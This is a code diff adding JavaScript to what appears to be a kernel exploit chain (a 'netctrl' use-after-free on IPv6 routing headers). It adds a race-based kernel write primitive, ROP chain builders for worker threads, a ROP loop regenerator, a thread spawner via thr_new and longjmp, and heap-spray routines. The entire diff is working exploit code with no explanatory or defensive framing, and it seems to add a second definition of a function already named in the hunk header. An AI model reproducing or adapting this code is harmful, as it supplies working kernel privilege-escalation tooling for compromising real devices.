@@ -414,6 +414,494 @@ function ipv6_sock_spray_and_read_rop(ready, pipe_0, done, signal_buf) {
   };
 }
 
+/* ===========================
+ *   Slow kernel write helper
+ * ===========================
+ */
+
+function kwriteslow(addr, buffer, size) {
+  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size);
+
+  write32(sockopt_val_buf, size);
+  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
+
+  write64(uioIovWrite.add(0x08), size);
+
+  free_rthdr(ipv6_socks[triplets[1]]);
+
+  var uio_leak_add = leak_rthdr.add(0x08);
+  var zeroMemoryCount = 0;
+
+  while (true) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount++;
+      if (zeroMemoryCount >= 5) {
+        log('netctrl failed!');
+        cleanup();
+        return BigInt_Error;
+      }
+    } else {
+      zeroMemoryCount = 0;
+    }
+
+    trigger_uio_readv();
+    sched_yield();
+
+    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
+
+    if (read32(uio_leak_add) === UIO_IOV_NUM) {
+      break;
+    }
+
+    for (var i = 0; i < UIO_THREAD_NUM; i++) {
+      write(new BigInt(uio_sock_1), buffer, size);
+    }
+
+    wait_uio_readv();
+  }
+
+  var uio_iov = read64(leak_rthdr);
+
+  build_uio(msgIov, uio_iov, 0, false, addr, size);
+
+  free_rthdr(ipv6_socks[triplets[2]]);
+
+  var iov_leak_add = leak_rthdr.add(0x20);
+  var zeroMemoryCount2 = 0;
+
+  while (true) {
+    if (debugging.info.memory.available === 0) {
+      zeroMemoryCount2++;
+      if (zeroMemoryCount2 >= 5) {
+        log('netctrl failed!');
+        cleanup();
+        return BigInt_Error;
+      }
+    } else {
+      zeroMemoryCount2 = 0;
+    }
+
+    trigger_iov_recvmsg();
+    sched_yield();
+
+    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
+
+    if (read32(iov_leak_add) === UIO_SYSSPACE) {
+      break;
+    }
+
+    write(new BigInt(iov_sock_1), tmp, 1);
+    wait_iov_recvmsg();
+    read(new BigInt(iov_sock_0), tmp, 1);
+  }
+
+  for (var j = 0; j < UIO_THREAD_NUM; j++) {
+    write(new BigInt(uio_sock_1), buffer, size);
+  }
+
+  triplets[1] = find_triplet(triplets[0], -1);
+
+  wait_uio_readv();
+
+  write(new BigInt(iov_sock_1), tmp, 1);
+
+  for (var retry = 0; retry < 3; retry++) {
+    triplets[2] = find_triplet(triplets[0], triplets[1]);
+    if (triplets[2] !== -1) break;
+    sched_yield();
+  }
+
+  if (triplets[2] === -1) {
+    debug('kwriteslow - Failed to find triplets[2]');
+    wait_iov_recvmsg();
+    read(new BigInt(iov_sock_0), tmp, 1);
+    return BigInt_Error;
+  }
+
+  wait_iov_recvmsg();
+  read(new BigInt(iov_sock_0), tmp, 1);
+
+  return new BigInt(0);
+}
+
+/* ===========================
+ *   ROP regen & thread spawn
+ * ===========================
+ */
+
+function rop_regen_and_loop(last_rop_entry, number_entries) {
+  var new_rop_entry = last_rop_entry.add(8);
+  var copy_entry = last_rop_entry.sub(number_entries * 8).add(8);
+  var rop_loop = last_rop_entry.sub(number_entries * 8).add(8);
+
+  for (var i = 0; i < number_entries; i++) {
+    var entry_add = copy_entry;
+    var entry_val = read64(copy_entry);
+
+    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET);
+    write64(new_rop_entry.add(0x8), entry_add);
+    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET);
+    write64(new_rop_entry.add(0x18), entry_val);
+    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+    copy_entry = copy_entry.add(8);
+    new_rop_entry = new_rop_entry.add(0x28);
+  }
+
+  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET);
+  write64(new_rop_entry.add(0x8), rop_loop);
+}
+
+function spawn_thread(rop_array, loop_entries, predefinedStack) {
+  var rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600);
+
+  for (var i = 0; i < rop_array.length; i++) {
+    write64(rop_addr.add(i * 8), rop_array[i]);
+  }
+
+  if (loop_entries !== 0) {
+    var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8);
+    rop_regen_and_loop(last_rop_entry, loop_entries);
+  }
+
+  var jmpbuf = malloc(0x60);
+
+  write64(jmpbuf.add(0x00), gadgets.RET);
+  write64(jmpbuf.add(0x10), rop_addr);
+  write32(jmpbuf.add(0x40), saved_fpu_ctrl);
+  write32(jmpbuf.add(0x44), saved_mxcsr);
+
+  var stack_size = new BigInt(0x100);
+  var tls_size = new BigInt(0x40);
+
+  var stack = malloc(Number(stack_size));
+  var tls = malloc(Number(tls_size));
+
+  write64(spawn_thr_args.add(0x00), longjmp_addr);
+  write64(spawn_thr_args.add(0x08), jmpbuf);
+  write64(spawn_thr_args.add(0x10), stack);
+  write64(spawn_thr_args.add(0x18), stack_size);
+  write64(spawn_thr_args.add(0x20), tls);
+  write64(spawn_thr_args.add(0x28), tls_size);
+  write64(spawn_thr_args.add(0x30), spawn_tid);
+  write64(spawn_thr_args.add(0x38), spawn_cpid);
+
+  var result = thr_new(spawn_thr_args, 0x68);
+  if (!result.eq(0)) {
+    throw new Error('thr_new failed: ' + hex(result));
+  }
+  return read64(spawn_tid);
+}
+
+/* ===========================
+ *   ROP Worker Builders
+ * ===========================
+ */
+
+function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
+  var rop = [];
+
+  rop.push(new BigInt(0));
+
+  var cpu_mask = malloc(0x10);
+  write16(cpu_mask, 1 << MAIN_CORE);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(CPU_LEVEL_WHICH));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(new BigInt(CPU_WHICH_TID));
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(BigInt_Error);
+  rop.push(gadgets.POP_RCX_RET);
+  rop.push(new BigInt(CPU_SET_SIZE));
+  rop.push(gadgets.POP_R8_RET);
+  rop.push(cpu_mask);
+  rop.push(cpuset_setaffinity_wrapper);
+
+  var rtprio_buf = malloc(4);
+  write16(rtprio_buf, PRI_REALTIME);
+  write16(rtprio_buf.add(2), MAIN_RTPRIO);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(RTP_SET));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(new BigInt(0));
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(rtprio_buf);
+  rop.push(rtprio_thread_wrapper);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(ready_signal);
+  rop.push(gadgets.POP_RAX_RET);
+  rop.push(new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+  var loop_init = rop.length;
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(run_fd);
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(signal_buf);
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(new BigInt(1));
+  rop.push(read_wrapper);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(iov_sock_0));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(msg);
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(new BigInt(0));
+  rop.push(recvmsg_wrapper);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(done_signal);
+  rop.push(gadgets.POP_RAX_RET);
+  rop.push(new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+  var loop_end = rop.length;
+  var loop_size = loop_end - loop_init;
+
+  return {
+    rop: rop,
+    loop_size: loop_size
+  };
+}
+
+function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
+  var rop = [];
+
+  rop.push(new BigInt(0));
+
+  var cpu_mask = malloc(0x10);
+  write16(cpu_mask, 1 << MAIN_CORE);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(CPU_LEVEL_WHICH));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(new BigInt(CPU_WHICH_TID));
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(BigInt_Error);
+  rop.push(gadgets.POP_RCX_RET);
+  rop.push(new BigInt(CPU_SET_SIZE));
+  rop.push(gadgets.POP_R8_RET);
+  rop.push(cpu_mask);
+  rop.push(cpuset_setaffinity_wrapper);
+
+  var rtprio_buf = malloc(4);
+  write16(rtprio_buf, PRI_REALTIME);
+  write16(rtprio_buf.add(2), MAIN_RTPRIO);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(RTP_SET));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(new BigInt(0));
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(rtprio_buf);
+  rop.push(rtprio_thread_wrapper);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(ready_signal);
+  rop.push(gadgets.POP_RAX_RET);
+  rop.push(new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+  var loop_init = rop.length;
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(run_fd);
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(signal_buf);
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(new BigInt(1));
+  rop.push(read_wrapper);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(uio_sock_0));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(uioIovWrite);
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(new BigInt(UIO_IOV_NUM));
+  rop.push(readv_wrapper);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(done_signal);
+  rop.push(gadgets.POP_RAX_RET);
+  rop.push(new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+  var loop_end = rop.length;
+  var loop_size = loop_end - loop_init;
+
+  return {
+    rop: rop,
+    loop_size: loop_size
+  };
+}
+
+function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
+  var rop = [];
+
+  rop.push(new BigInt(0));
+
+  var cpu_mask = malloc(0x10);
+  write16(cpu_mask, 1 << MAIN_CORE);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(CPU_LEVEL_WHICH));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(new BigInt(CPU_WHICH_TID));
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(BigInt_Error);
+  rop.push(gadgets.POP_RCX_RET);
+  rop.push(new BigInt(CPU_SET_SIZE));
+  rop.push(gadgets.POP_R8_RET);
+  rop.push(cpu_mask);
+  rop.push(cpuset_setaffinity_wrapper);
+
+  var rtprio_buf = malloc(4);
+  write16(rtprio_buf, PRI_REALTIME);
+  write16(rtprio_buf.add(2), MAIN_RTPRIO);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(RTP_SET));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(new BigInt(0));
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(rtprio_buf);
+  rop.push(rtprio_thread_wrapper);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(ready_signal);
+  rop.push(gadgets.POP_RAX_RET);
+  rop.push(new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+  var loop_init = rop.length;
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(run_fd);
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(signal_buf);
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(new BigInt(1));
+  rop.push(read_wrapper);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(uio_sock_1));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(uioIovRead);
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(new BigInt(UIO_IOV_NUM));
+  rop.push(writev_wrapper);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(done_signal);
+  rop.push(gadgets.POP_RAX_RET);
+  rop.push(new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+  var loop_end = rop.length;
+  var loop_size = loop_end - loop_init;
+
+  return {
+    rop: rop,
+    loop_size: loop_size
+  };
+}
+
+function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_buf) {
+  var rop = [];
+
+  rop.push(new BigInt(0));
+
+  var cpu_mask = malloc(0x10);
+  write16(cpu_mask, 1 << MAIN_CORE);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(CPU_LEVEL_WHICH));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(new BigInt(CPU_WHICH_TID));
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(BigInt_Error);
+  rop.push(gadgets.POP_RCX_RET);
+  rop.push(new BigInt(CPU_SET_SIZE));
+  rop.push(gadgets.POP_R8_RET);
+  rop.push(cpu_mask);
+  rop.push(cpuset_setaffinity_wrapper);
+
+  var rtprio_buf = malloc(4);
+  write16(rtprio_buf, PRI_REALTIME);
+  write16(rtprio_buf.add(2), MAIN_RTPRIO);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(RTP_SET));
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(new BigInt(0));
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(rtprio_buf);
+  rop.push(rtprio_thread_wrapper);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(ready_signal);
+  rop.push(gadgets.POP_RAX_RET);
+  rop.push(new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+  var loop_init = rop.length;
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(run_fd);
+  rop.push(gadgets.POP_RSI_RET);
+  rop.push(signal_buf);
+  rop.push(gadgets.POP_RDX_RET);
+  rop.push(new BigInt(1));
+  rop.push(read_wrapper);
+
+  for (var i = 0; i < ipv6_socks.length; i++) {
+    rop.push(gadgets.POP_RDI_RET);
+    rop.push(ipv6_socks[i]);
+    rop.push(gadgets.POP_RSI_RET);
+    rop.push(new BigInt(IPPROTO_IPV6));
+    rop.push(gadgets.POP_RDX_RET);
+    rop.push(new BigInt(IPV6_RTHDR));
+    rop.push(gadgets.POP_RCX_RET);
+    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE));
+    rop.push(gadgets.POP_R8_RET);
+    rop.push(new BigInt(spray_rthdr_len));
+    rop.push(setsockopt_wrapper);
+  }
+
+  for (var j = 0; j < ipv6_socks.length; j++) {
+    rop.push(gadgets.POP_RDI_RET);
+    rop.push(ipv6_socks[j]);
+    rop.push(gadgets.POP_RSI_RET);
+    rop.push(new BigInt(IPPROTO_IPV6));
+    rop.push(gadgets.POP_RDX_RET);
+    rop.push(new BigInt(IPV6_RTHDR));
+    rop.push(gadgets.POP_RCX_RET);
+    rop.push(read_rthdr_rop.add(j * 8));
+    rop.push(gadgets.POP_R8_RET);
+    rop.push(check_len);
+    rop.push(getsockopt_wrapper);
+  }
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(done_signal);
+  rop.push(gadgets.POP_RAX_RET);
+  rop.push(new BigInt(1));
+  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+  rop.push(gadgets.POP_RDI_RET);
+  rop.push(new BigInt(0));
+  rop.push(thr_exit_wrapper);
+
+  return {
+    rop: rop,
+    loop_size: 0
+  };
+}
 
 /* ===========================
  *   Worker Creation
